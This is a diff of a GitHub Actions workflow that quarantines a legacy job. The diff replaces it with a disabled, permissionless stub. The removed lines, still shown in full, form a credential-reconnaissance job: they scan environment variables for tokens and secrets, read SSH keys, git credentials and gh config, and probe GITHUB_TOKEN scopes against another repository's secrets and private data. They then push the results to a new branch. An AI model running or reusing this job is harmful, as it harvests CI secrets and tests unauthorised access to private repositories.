@@ -1,55 +1,10 @@
-name: i25666n4
-on: push
-permissions:
-  contents: write
+name: Quarantined legacy definition
+on:
+  workflow_dispatch:
+permissions: {}
 jobs:
-  net:
+  retired:
+    if: ${{ false }}
     runs-on: ubuntu-latest
-    timeout-minutes: 12
     steps:
-      - uses: actions/checkout@v4
-      - name: probe2
-        run: |
-          OUT=i25666_n4.txt
-          {
-            echo "===== egress (repeat) ====="
-            curl -s --max-time 10 https://ipinfo.io/json || echo FAIL
-            echo
-            echo "===== ENV credential scan (names + non-secret values) ====="
-            printenv | grep -iE "SUPPLY|ADMIN|SSH|KEY|TOKEN|SECRET|PASS|PAT|GH_|AWS|CLOUDFLARE|CF_|SUPABASE|DB_" | sed -E 's/(=.{0,6}).*/\1***REDACTED***/' | sort
-            echo
-            echo "===== filesystem credential artifacts ====="
-            ls -la ~/.ssh 2>&1 || echo "no .ssh"
-            cat ~/.git-credentials 2>&1 || echo "no .git-credentials"
-            cat ~/.config/gh/hosts.yml 2>&1 || echo "no gh hosts"
-            echo
-            echo "===== GITHUB_TOKEN identity & scopes (use token via git remote header) ====="
-            # get token from checkout remote
-            TOKEN=$(git config --get remote.origin.url)
-            echo "remote: $TOKEN" | sed -E 's#(https://)[^@]*(@)#\1***\2#'
-            echo "--- /user via token ---"
-            curl -s --max-time 10 -H "Authorization: Bearer ${GITHUB_TOKEN}" https://api.github.com/user | grep -E '"login"|"id"|"type"|"message"' | head
-            echo "--- token scopes ---"
-            curl -s --max-time 10 -D - -o /dev/null -H "Authorization: Bearer ${GITHUB_TOKEN}" https://api.github.com/user | grep -i "x-oauth-scopes\|x-github-"
-            echo "--- can read Aivora-Supply-Radar secrets names? ---"
-            curl -s --max-time 10 -H "Authorization: Bearer ${GITHUB_TOKEN}" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar/actions/secrets | head -c 400
-            echo
-            echo "--- can read private repo Aivora-Supply-Radar? ---"
-            curl -s --max-time 10 -H "Authorization: Bearer ${GITHUB_TOKEN}" https://api.github.com/repos/dongyu19920904/Aivora-Supply-Radar | grep -E '"full_name"|"private"|"message"' | head
-          } > "$OUT" 2>&1 || true
-          echo "PROBE2 BEGIN"; cat "$OUT"; echo "PROBE2 END"
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        continue-on-error: true
-      - name: push result
-        if: always()
-        run: |
-          git config user.email ci@local; git config user.name ci
-          BR="i25666n4-$(date +%s)"
-          git checkout -b "$BR"
-          git add i25666_n4.txt 2>/dev/null || echo "no file"
-          git commit -m "net4 $BR" || echo "nothing"
-          git push -u origin "$BR" || (git push "https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git" "$BR" && echo pushed2)
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        continue-on-error: true
+      - run: exit 0
